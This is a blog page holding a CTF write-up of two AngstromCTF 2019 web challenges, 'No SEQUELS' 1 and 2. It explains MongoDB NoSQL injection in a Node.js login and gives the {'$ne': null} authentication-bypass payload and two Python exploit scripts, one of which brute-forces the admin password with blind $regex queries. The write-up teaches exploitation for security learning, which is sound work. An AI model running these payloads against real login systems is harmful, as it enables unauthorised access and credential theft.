<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        AngstromCTF 2019 | No SEQUELS and No SEQUELS 2 Web Writeup ::
        CHERIEF Yassine — Cybersecutrity enthusiast
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="This blog post contains the writeup for two challenges (No SEQUELS &amp;amp; No SEQUELS 2), because they are related.
So let&amp;rsquo;s start with No SEQUELS first.
1. No SEQUELS 1 Category: Web
Points: 50
 1.2 Challenge Description  The prequels sucked, and the sequels aren&amp;rsquo;t much better, but at least we always have the original trilogy.
  Hint said : MongoDB is a safer alternative to SQL, right?"
/>
<meta
  name="keywords"
  content="cybersecurity, security, networking, ctf, writeups, education, blog, algeria, algerian, student"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://yassinecherief.com/posts/angstromctf-2019-no-sequels-and-no-sequels2-web-writeup/" />





<link rel="stylesheet" href="https://yassinecherief.com/assets/style.css" />

<link rel="stylesheet" href="https://yassinecherief.com/style.css" />


<link
  rel="apple-touch-icon-precomposed"
  sizes="144x144"
  href="https://yassinecherief.com/img/apple-touch-icon-144-precomposed.png"
/>
<link rel="shortcut icon" href="https://yassinecherief.com/img/favicon.png" />


<link href="https://yassinecherief.com/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://yassinecherief.com/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://yassinecherief.com/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://yassinecherief.com/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://yassinecherief.com/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://yassinecherief.com/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="AngstromCTF 2019 | No SEQUELS and No SEQUELS 2 Web Writeup"/>
<meta name="twitter:description" content="This blog post contains the writeup for two challenges (No SEQUELS &amp; No SEQUELS 2), because they are related.
So let&rsquo;s start with No SEQUELS first.
1. No SEQUELS 1 Category: Web
Points: 50
 1.2 Challenge Description  The prequels sucked, and the sequels aren&rsquo;t much better, but at least we always have the original trilogy.
  Hint said : MongoDB is a safer alternative to SQL, right?"/>



<meta property="og:title" content="AngstromCTF 2019 | No SEQUELS and No SEQUELS 2 Web Writeup" />
<meta property="og:description" content="This blog post contains the writeup for two challenges (No SEQUELS &amp; No SEQUELS 2), because they are related.
So let&rsquo;s start with No SEQUELS first.
1. No SEQUELS 1 Category: Web
Points: 50
 1.2 Challenge Description  The prequels sucked, and the sequels aren&rsquo;t much better, but at least we always have the original trilogy.
  Hint said : MongoDB is a safer alternative to SQL, right?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://yassinecherief.com/posts/angstromctf-2019-no-sequels-and-no-sequels2-web-writeup/" />
<meta property="article:published_time" content="2019-04-26T01:49:01+02:00" />
<meta property="article:modified_time" content="2019-04-26T01:49:01+02:00" /><meta property="og:site_name" content="CHERIEF Yassine" />






<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
    onload="renderMathInElement(document.body);"></script>



  </head>
  <body class="">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >./1337.sh</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/posts">Posts</a></li>
        
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/categories">Categories</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/posts">Posts</a></li>
      
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/categories">Categories</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">AngstromCTF 2019 | No SEQUELS and No SEQUELS 2 Web Writeup</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2019-04-26
        </span>

        
          
        
      

      
        <span class="post-author"
          >— Written by CHERIEF Yassine (omega_coder)</span
        >


      
        <span class="post-read-time"
          >— 6 min read</span
        >
      
    </div>

    
      <span class="post-tags">
        
          <a href="https://yassinecherief.com/tags/ctf/">#ctf</a>&nbsp;
        
          <a href="https://yassinecherief.com/tags/nosql/">#nosql</a>&nbsp;
        
          <a href="https://yassinecherief.com/tags/mongodb/">#mongodb</a>&nbsp;
        
          <a href="https://yassinecherief.com/tags/nosql-injection/">#nosql-injection</a>&nbsp;
        
          <a href="https://yassinecherief.com/tags/web/">#web</a>&nbsp;
        
          <a href="https://yassinecherief.com/tags/writeup/">#writeup</a>&nbsp;
        
      </span>
    

    

    <div class="post-content">
      
      <p>This blog post contains the writeup for two challenges (No SEQUELS &amp; No SEQUELS 2), because they are related.</p>
<p>So let&rsquo;s start with No SEQUELS first.</p>
<h1 id="1-no-sequels-1">1. No SEQUELS 1</h1>
<p><strong>Category:</strong> Web<br>
<strong>Points:</strong> 50</p>
<hr>
<h2 id="12-challenge-description">1.2 Challenge Description</h2>
<blockquote>
<p>The prequels sucked, and the sequels aren&rsquo;t much better, but at least we always have the <a href="https://nosequels.2019.chall.actf.co">original trilogy</a>.</p>
</blockquote>
<blockquote>
<p>Hint said : <em>MongoDB is a safer alternative to SQL, right?</em></p>
</blockquote>
<h4 id="13-what-we-can-get-from-the-informations-stated-above-">1.3 What we can get from the informations stated above ?</h4>
<ul>
<li>They are using MongoDB as a NoSQL engine.</li>
<li>we can guess from hint that its a simple Auth bypass with MongoDB NoSQL injection.</li>
</ul>
<p>We are presented a part of the source code of how the authentication happens.</p>
<p><img src="https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1556371044/1_xKB1P9_JsMbdjYLkCsnHvw.png" alt="no_sequels_source_code"></p>
<h3 id="14-exaplanation">1.4 Exaplanation</h3>
<p>This simple authentication uses <code>JWT</code> (JSON Web Tokens), trying to hack the token won&rsquo;t help because the JWT token is being signed with a <code>secret key</code> and we don&rsquo;t know the key actually.</p>
<p>After reading the code, this is clearly a NoSQL Injection because of unsanitized user input.</p>
<p>The following two lines show that the variables username and password are not sanitized in any way.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">pass</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>;
</code></pre></div><p>One more thing to notice, the line below show that the body can be parsed using json regarded that we supply some json input with <code>Content-Type: application/json</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>());
</code></pre></div><p>NoSQL databases are still potentially vulnerable to injection attacks, even if they aren&rsquo;t using the traditional <code>SQL</code> syntax.</p>
<p>The unsanitisation of username and password will lead to NoSQL code injection.</p>
<p>What would happen if we post the following JSON data:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> https://nosequels.2019.chall.actf.co <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
<span style="color:#960050;background-color:#1e0010">{</span>
    <span style="color:#e6db74">&#34;username&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#66d9ef">null</span>}<span style="color:#960050;background-color:#1e0010">,</span>
    <span style="color:#e6db74">&#34;password&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#66d9ef">null</span>}
<span style="color:#960050;background-color:#1e0010">}</span>
</code></pre></div><p>By Sending this payload the username &amp; password will be parsed as so, thus the query being</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> {
    <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#34;$ne&#34;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>};
    <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#34;$ne&#34;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>};
}
    
</code></pre></div><p>Now, executing the line below from the app source code will return the first row, and we will be authenticated.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">collection</span>(<span style="color:#e6db74">&#39;users&#39;</span>).<span style="color:#a6e22e">findOne</span>(<span style="color:#a6e22e">query</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">user</span>) {
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">user</span>) {
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Wrong username or password&#34;</span>);
        <span style="color:#66d9ef">return</span> 
    }
    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">cookie</span>(<span style="color:#e6db74">&#39;token&#39;</span>, <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">sign</span>({<span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">authnticated</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>}, <span style="color:#a6e22e">secret</span>));
    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/site&#34;</span>);
});
</code></pre></div><p>Let&rsquo;s write a script to do the work for us, and get that first <code>FLAG</code>.</p>
<p>We will be using python requests module.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> re
URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://nosequels.2019.chall.actf.co/login&#34;</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;username&#34;: {&#34;$ne&#34;: null}, &#34;password&#34;: {&#34;$ne&#34;: null}}&#39;</span>
cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;token&#34;</span>: <span style="color:#e6db74">&#34;still_dont_know&#34;</span>} 
<span style="color:#75715e"># we could have done it manually, and replaced the token with</span>
<span style="color:#75715e"># the token that your browser got for you</span>

<span style="color:#75715e"># init session</span>
session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
<span style="color:#75715e"># set re expression for token in headers</span>
jwt_token_re <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;token=(.*);&#34;</span>)
<span style="color:#75715e"># Getting the token for the first time</span>

token_req <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(URL)
<span style="color:#66d9ef">if</span> token_req<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
    m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(jwt_token_re, token_req<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Set-Cookie&#34;</span>])
    <span style="color:#66d9ef">if</span> m:
        <span style="color:#75715e"># update token in cookies dict</span>
        cookies[<span style="color:#e6db74">&#34;token&#34;</span>] <span style="color:#f92672">=</span> str(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>))

    <span style="color:#75715e"># Now let&#39;s send the json payload alongside the cookie we got above.</span>
    <span style="color:#75715e"># we will leave requests default behaviour to follow redirects which will redirect us to /site</span>

flag_re <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;actf{.*}&#34;</span>)

<span style="color:#75715e"># make request with mallicious payload</span>

req <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(URL, json<span style="color:#f92672">=</span>payload, cookies<span style="color:#f92672">=</span>cookies, verify<span style="color:#f92672">=</span>False)
<span style="color:#75715e"># verify=False is just for HTTPS connection</span>

<span style="color:#66d9ef">if</span> req<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
    <span style="color:#75715e"># FLAG match</span>
    m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(flag_re, req<span style="color:#f92672">.</span>text)
    <span style="color:#66d9ef">if</span> m:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;1st FLAG: &#34;</span>, m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>)) 
</code></pre></div><p><strong><code>FLAG is : actf{no_sql_doesn’t_mean_no_vuln}</code></strong></p>
<p><code>NOTE: we could have done the same thing using BurpSuite: first we send the query, intercept it using BurpSuite, change Content-Type to application/json and modify the body with our json payload. :D</code></p>
<h1 id="2-no-sequels-2">2. No SEQUELS 2</h1>
<p>Let&rsquo;s see the solution for NoSEQUELS 2</p>
<p>If we copy the last token we got after sending the json payload, we can now request <strong><code>/site</code></strong> (using a GET request of course) and we are presented with the following page.</p>
<p><img src="https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1556487393/1_zD92g6-1Z1HnRlHcfkrbBg.png" alt="site_page"></p>
<p>It says <code>suspicious activity detected</code> and we need to provide the password for user <strong><code>admin</code></strong> and one more thing, it says that there will be no database query!!!.</p>
<h3 id="21-things-we-can-derive-from-the-above">2.1 Things we can derive from the above.</h3>
<ol>
<li><code>admin</code> user exists.</li>
<li>the exploitation will be on the previous login page, because we can&rsquo;t do no database query here.</li>
</ol>
<p>So, we need to get the correct password for <code>admin</code>, and we will do it using <code>$regex</code> and also we need to do it in a Blind way</p>
<p>Here is the payload we will be using</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">new_payload</span> <span style="color:#960050;background-color:#1e0010">=</span> {<span style="color:#f92672">&#34;username&#34;</span>: {<span style="color:#f92672">&#34;$eq&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span> }, <span style="color:#f92672">&#34;password&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^some_chars.*&#34;</span>}}
</code></pre></div><p>So basically, we will be bruteforcing the password by checking it against a regular expression pattern.</p>
<h4 id="22-example">2.2 Example</h4>
<p>let&rsquo;s say we send the following payload</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">payload</span> <span style="color:#960050;background-color:#1e0010">=</span> {<span style="color:#f92672">&#34;username&#34;</span>: {<span style="color:#f92672">&#34;$eq&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span> }, <span style="color:#f92672">&#34;password&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^c.*&#34;</span>}}
</code></pre></div><p>if we get a 302 status code (a redirect to <code>/site</code>) then the password does indeed start with a <strong><code>c</code></strong>, now we can build our final Blind NoSQL exploitation script using python</p>
<p>You can also get the password length using <strong><code>$regex</code></strong> again, with this payload <strong><code>.{number}</code></strong>, i already found the password length to be equal to <code>14</code>.</p>
<h3 id="23-final-exploit-script-fully-automated">2.3 Final Exploit Script, (fully automated)</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests <span style="color:#75715e"># used to make requests</span>
<span style="color:#f92672">import</span> string   <span style="color:#75715e"># for building the password</span>
<span style="color:#f92672">import</span> re       <span style="color:#75715e"># for cheking token pattern and FLAG pattern</span>

session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session() <span style="color:#75715e"># creates a session, not really needed tho.</span>
cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;token&#34;</span>: <span style="color:#e6db74">&#34;fucking_dont_know_1337&#34;</span>}
URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://nosequels.2019.chall.actf.co/login&#34;</span>

<span style="color:#75715e"># make first GET request.</span>
<span style="color:#75715e"># this is only done to get the first unauthenticated token</span>
jwt_token_re <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;token=(.*);&#34;</span>)
dummy <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(URL)

<span style="color:#66d9ef">if</span> dummy<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
    m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(jwt_token_re, dummy<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Set-Cookie&#34;</span>])
    <span style="color:#66d9ef">if</span> m:
        cookies[<span style="color:#e6db74">&#34;token&#34;</span>] <span style="color:#f92672">=</span> str(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>))
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[?] Cookie set&#34;</span>)

<span style="color:#75715e"># Creates new payload</span>
new_payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: {<span style="color:#e6db74">&#34;$eq&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span> }, <span style="color:#e6db74">&#34;password&#34;</span>: {<span style="color:#e6db74">&#34;$regex&#34;</span>: None}}


restart_the_damn_loop <span style="color:#f92672">=</span> True <span style="color:#75715e"># control the loop, no one want an infinite loop</span>
regex_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e"># this is the current compared password </span>
flag <span style="color:#f92672">=</span> regex_payload <span style="color:#75715e"># flag is initialized as regex payload == &#34;&#34;</span>

<span style="color:#66d9ef">while</span> restart_the_damn_loop:
    restart_the_damn_loop <span style="color:#f92672">=</span> False
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;!@#$%^()@_{}&#34;</span>:
        regex_payload <span style="color:#f92672">+=</span> i
        new_payload[<span style="color:#e6db74">&#34;password&#34;</span>][<span style="color:#e6db74">&#34;$regex&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;^&#34;</span><span style="color:#f92672">+</span>regex_payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.*&#34;</span>
        req <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(URL, verify<span style="color:#f92672">=</span>False, cookies<span style="color:#f92672">=</span>cookies, json<span style="color:#f92672">=</span>new_payload, allow_redirects<span style="color:#f92672">=</span>False)
        <span style="color:#66d9ef">if</span> req<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">302</span>: <span style="color:#75715e"># a 302 repsonse code means payload passed</span>
            restart_the_damn_loop <span style="color:#f92672">=</span> True
            flag <span style="color:#f92672">+=</span> i
            <span style="color:#66d9ef">if</span> len(flag) <span style="color:#f92672">==</span> <span style="color:#ae81ff">14</span>: <span style="color:#75715e"># check if length == 14</span>
                restart_the_damn_loop <span style="color:#f92672">=</span> False
                m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(jwt_token_re, req<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Set-Cookie&#34;</span>])
                <span style="color:#66d9ef">if</span> m:
                    <span style="color:#75715e"># sets the token cookie, we will use it when visiting /site</span>
                    cookies[<span style="color:#e6db74">&#34;token&#34;</span>] <span style="color:#f92672">=</span> str(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>))
                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[?] pass till now : &#34;</span>, flag)
                <span style="color:#66d9ef">break</span>
        <span style="color:#66d9ef">else</span>:
            regex_payload <span style="color:#f92672">=</span> flag
            restart_the_damn_loop <span style="color:#f92672">=</span> True


<span style="color:#75715e"># make last request and get the damn flag.</span>

<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Password: &#34;</span> <span style="color:#f92672">+</span> flag)
URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://nosequels.2019.chall.actf.co/site&#34;</span>

<span style="color:#75715e"># POST Parameter for /site page is named : pass2</span>
r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(URL, verify<span style="color:#f92672">=</span>False, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;pass2&#34;</span>: flag}, cookies<span style="color:#f92672">=</span>cookies)
<span style="color:#75715e"># setting verify=False is only better when solving CTF challenges.</span>
<span style="color:#75715e"># because we dont need it :D   </span>
m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;actf{.*}&#34;</span>, r<span style="color:#f92672">.</span>text)
<span style="color:#66d9ef">if</span> m:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] FLAG: &#34;</span>, m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>))

</code></pre></div><p>An here is the flag: <strong><code>actf{still_no_sql_in_the_sequel}</code></strong></p>
<p>Thanks for reading! :D</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://yassinecherief.com/posts/inshack-you-shall-not-pass-forensics-330-writeup/">
                  <span class="button__icon">←</span>
                  <span class="button__text">INShAck 2019 :: You Shall Not Pass :: Forensics 330 Writeup</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="https://yassinecherief.com/posts/angstromctf-2019-secret-sheep-society-writeup-crypto/">
                  <span class="button__text">AngstromCTF 2019 Secret Sheep Society | CTF Writeup</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "omega-coder" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">Yassine CHERIEF</div>
      
  </div>
</footer>

<script src="https://yassinecherief.com/assets/main.js"></script>
<script src="https://yassinecherief.com/assets/prism.js"></script>


      
    </div>

    
  </body>
</html>
